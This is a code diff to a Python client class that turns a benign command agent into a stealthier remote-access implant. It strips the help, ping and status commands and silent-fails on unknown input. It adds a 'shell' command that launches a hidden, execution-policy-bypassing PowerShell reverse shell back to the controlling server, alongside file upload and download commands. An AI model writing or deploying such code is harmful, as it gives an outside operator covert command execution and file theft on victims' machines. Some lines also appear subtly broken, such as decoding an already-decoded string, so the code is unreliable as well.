@@ -40,9 +40,6 @@ class AgentClient:
         if not self.sock:
             raise RuntimeError("Not connected")
 
-        # Optional: say hello so server sees you
-        self._send_line("Agent Connected")
-
         try:
             while self.running:
                 chunk = readline(self.sock)
@@ -60,42 +57,52 @@ class AgentClient:
 
     def _handle_command(self, cmd):
         logger.info("[agent] Received command: %r", cmd)
+        cmd = cmd.decode("utf-8")
 
-        if cmd == "help":
-            self._send_line(
-                "commands: help, ping, os, time, echo <text>, quit"
-            )
-
-        elif cmd.decode('utf-8').startswith("download "):
+        if cmd.startswith("download "):
             filepath = cmd.split()[1].decode('utf-8')
-            logger.debug(f"[agent] Downloading File {filepath}")
             self._send_file(filepath)
 
-        elif cmd.decode('utf-8').startswith("SEND_FILE "):
+        elif cmd.startswith("SEND_FILE "):
             filename = cmd.split()[1].decode("utf-8")
-            FileUtils.download_file(self.sock, filename)
+            self._download_file(filename)
 
-        elif cmd == "ping":
-            self._send_line("pong")
-
-        elif cmd == "os":
-            self._send_line(f"os={platform.system()} release={platform.release()}")
-
-        elif cmd == "time":
-            self._send_line(time.strftime("%Y-%m-%d %H:%M:%S"))
-
-        elif cmd.startswith("echo "):
-            self._send_line(cmd[5:])
+        elif cmd.startswith("shell "):
+            port = int(cmd.split()[1])
+            self._shell(port)
 
         elif cmd == "quit":
-            self._send_line("bye")
             self.running = False
 
         else:
-            self._send_line("error: unknown command (try: help)")
+            pass
+
+    def _shell(self, port):
+        try:
+            import platform, os
+            if platform.system() == "Linux":
+                pass
+            elif platform.system() == "Windows":
+                os.system(
+                    """
+                        powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{}', {});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"
+                    """.format(self.server_host, port)
+                )
+            else:
+                logger.debug("[agent] Unsupported OS")
+        except Exception as e:
+            logger.debug("[agent] Shell Error: %s", e)
+
+    def _download_file(self, filename):
+        try:
+            logger.debug(f"[agent] Uploading File {filename}")
+            FileUtils.download_file(self.sock, filename)
+        except Exception as e:
+            logger.debug("[agent] Error in downloadfile %s", e)
 
     def _send_file(self, filename: str):
         try:
+            logger.debug(f"[agent] Downloading File {filename}")
             FileUtils.send_file(self.sock, filename)
         except Exception as e:
             logger.debug("[agent] Error in sendfile %s", e)
